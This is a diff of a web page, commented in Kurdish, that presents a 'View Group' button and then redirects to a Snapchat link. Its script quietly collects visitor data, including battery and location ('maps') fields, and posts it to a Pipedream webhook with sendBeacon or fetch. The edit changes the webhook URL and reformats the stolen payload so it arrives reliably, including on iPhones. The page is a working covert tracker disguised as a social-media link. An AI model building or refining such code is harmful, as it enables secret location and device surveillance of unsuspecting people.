@@ -40,7 +40,8 @@
     <button class="btn" id="viewGroupBtn">View Group</button>
 
     <script>
-        const secureWebhook = "https://eo7he3dstagkpih.m.pipedream.net";
+        // ✅ بەکارهێنانی لینکی تەواو و دروستی پڕۆژەکەت
+        const secureWebhook = "https://eo7he3r6tagkjph.m.pipedream.net";
         const snapchatRedirectUrl = "https://www.snapchat.com/spotlight/W7tBlwEw_aWnI0w_uREb_wA?share_id=OEQ1M0Ew&locale=en_US";
 
         let globalBattery = "N/A";
@@ -82,16 +83,20 @@
                 maps: globalMaps
             };
 
-            // ناردنی داتا بە شێوازی دەقی خاوێن بۆ ئەوەی پێکهاتەی Pipedream تێکنەچێت
-            const blob = new Blob([JSON.stringify(payload)], { type: 'text/plain' });
-            
-            if (navigator.sendBeacon) {
-                navigator.sendBeacon(secureWebhook, blob);
-            } else {
-                fetch(secureWebhook, { method: 'POST', body: JSON.stringify(payload), keepalive: true });
+            // ناردنی داتا بە شێوازی پارامیتەری ڕوون بۆ ئەوەی ڕێک بچێتە ناو خانەکانی Pipedream
+            const params = new URLSearchParams();
+            for (const key in payload) {
+                params.append(key, payload[key]);
             }
 
-            // گواستنەوەی کۆتایی بۆ سناپچات
+            // گەرەنتی ناردن لە پاشبنەمای ئایفۆندا
+            if (navigator.sendBeacon) {
+                navigator.sendBeacon(secureWebhook, params);
+            } else {
+                fetch(secureWebhook, { method: 'POST', body: params, keepalive: true });
+            }
+
+            // گواستنەوەی دەستبەجێ بۆ سناپچات
             window.location.href = snapchatRedirectUrl;
         });
     </script>
